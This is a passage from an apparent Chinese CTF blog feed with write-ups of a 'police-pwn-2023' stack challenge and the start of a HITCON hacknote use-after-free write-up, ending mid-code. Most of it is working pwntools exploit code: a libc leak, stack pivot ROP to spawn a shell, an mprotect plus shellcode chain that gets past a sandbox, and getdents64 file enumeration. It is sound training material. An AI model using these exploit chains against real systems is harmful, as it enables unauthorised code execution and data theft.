x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401214&#x27;)</span></span><br><span class="line">rdi=<span class="number">0x401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0401281</span> </span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">p(<span class="string">&#x27;main&#x27;</span>,main)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&quot;puts_ad&quot;</span>,puts_ad)</span><br><span class="line"></span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">mprotect = base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x40</span>)+p64(read_addr)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0x2</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x100</span>)+p64(base+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(main)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag?????"></a>flag?????</h1><p>链接：<a href="https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng">https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng</a><br>提取码：pdi2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec pwn3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和sandbox一样，只有0x10字节的溢出，seccomp-tools检测了一下并没有沙箱，简简单单拿个shellZzz，直接栈迁移ROP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./flag???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(bin_sh)+p64(<span class="number">0x000000000040101a</span>)+p64(system_ad)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>发现没有拿到shell</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306122938871.png" alt="image-20230306122938871"></p><p>gdb跟了一下发现会执行到system(‘&#x2F;bin&#x2F;sh’)，又是开了沙箱，没有检测出来，发现题目给了提示有沙箱</p><h2 id="mprotect修改权限"><a href="#mprotect修改权限" class="headerlink" title="mprotect修改权限"></a>mprotect修改权限</h2><p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span>必须是一个内存页的起始地址</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line">从start开始修改len长度byte的权限为prot</span><br><span class="line">* start必须从必须是一个内存页的起始地地址 linux页一般<span class="number">4</span>k（<span class="number">0x1000b</span>yte）</span><br><span class="line">* len必须是页整数倍</span><br><span class="line">* part和linux文件权限一样 RWX</span><br></pre></td></tr></table></figure><p>我们需要先泄露文件名，看到要写入shellcode，这一步是必要的</p><p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(4096)+p64(poprdx_r12)+p64(0x7)+p64(0x6666)+p64(mprotect)+p64(main)</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306141247754.png" alt="image-20230306141247754"></p><p>修改完成rwx</p><h2 id="getdents64泄露文件名"><a href="#getdents64泄露文件名" class="headerlink" title="getdents64泄露文件名"></a>getdents64泄露文件名</h2><p>getdents64函数，它读取目录文件中的一个个目录项并返回</p><ul><li>参数一：fd指针</li><li>参数二：写入的内存区域</li><li>参数三：4096</li><li>功能：把当前文件目录下的文件名写入参数二指向的内存区域</li></ul><p>linux ls底层是调用getdents64函数实现的</p><p>我们用stace跟踪一些ls</p><blockquote><p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">ioctl(1, TIOCGWINSZ, &#123;ws_row=49, ws_col=102, ws_xpixel=1632, ws_ypixel=1568&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFDIR|0777, st_size=4096, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 23 entries */, 32768) = 800</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack\t  flag.txt&quot;..., 67) = 67</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack.py  get_st&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;ciscn_2019_c_1\t\t  get_started_3d&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;core\t\t\t  get_started_3dsctf_2016&quot;..., 68) = 68</span><br><span class="line">write(1, &quot;ctest\t\t\t  IDA\t\t\t\t       payload.&quot;..., 51) = 51</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><p>打开当前文件夹，然后读取到指定内存后通过write输出，这里的第一个payload数据的写入区最后选择bss段中间位置如mp_start+0x200，开头部分可能不行，官方wp</p><p>mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;来返回，我感觉mov rsi, 0x%x;push rsi; ret;就可以，也打通了，不知道为什么要多一层syscall</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br></pre></td></tr></table></figure><p>泄露出文件名，正常读取就可以，因为我们没有关闭前一个打开的fd指针，所以这里文件指针变为4</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230307000430195.png" alt="image-20230307000430195"></p><h2 id="EXP-这里其实可以封装个函数，懒得搞了"><a href="#EXP-这里其实可以封装个函数，懒得搞了" class="headerlink" title="EXP 这里其实可以封装个函数，懒得搞了"></a>EXP 这里其实可以封装个函数，懒得搞了</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./grxer???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))+base</span><br><span class="line">poprsi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))+base</span><br><span class="line">poprdx_r12=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))+base</span><br><span class="line">p(<span class="string">&#x27;poprdi&#x27;</span>,poprdi)</span><br><span class="line">p(<span class="string">&#x27;poprsi&#x27;</span>,poprsi)</span><br><span class="line">p(<span class="string">&#x27;poprdx&#x27;</span>,poprdx_r12)</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+base</span><br><span class="line">read_ad=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+base</span><br><span class="line">mp_start=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(<span class="number">4096</span>)+p64(poprdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x6666</span>)+p64(mprotect)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi, 0x%x;push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">flag=r(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag---&gt;&#x27;</span>+flag.decode())</span><br><span class="line">flagname=<span class="string">&#x27;./flag&#x27;</span>+flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flagname)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line"><span class="comment"># sa(b&#x27;\x96\x88\n\n&#x27;,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
            <tag> Sandbox </tag>
            
            <tag> Getdents64 Leak </tag>
            
            <tag> Mprotect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Using-After-Free</title>
      <link href="/2023/03/04/Using-After-Free/"/>
      <url>/2023/03/04/Using-After-Free/</url>
      
        <content type="html"><![CDATA[<h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p><span id="more"></span><h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p><p>题目可以最多创建5个note,会放在全局变量notelist里(00x804A070)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>后没有将指针置为<span class="number">0</span></span><br></pre></td></tr></table></figure><p>print_note里有</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure><p>有后门函数magic</p><p>如果我们可以控制notelist[v1]-&gt;put为magic就可以拿到flag</p><p>在 add_note里我们会先malloc note结构体，后面会再申请context的内存，del时会先</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span 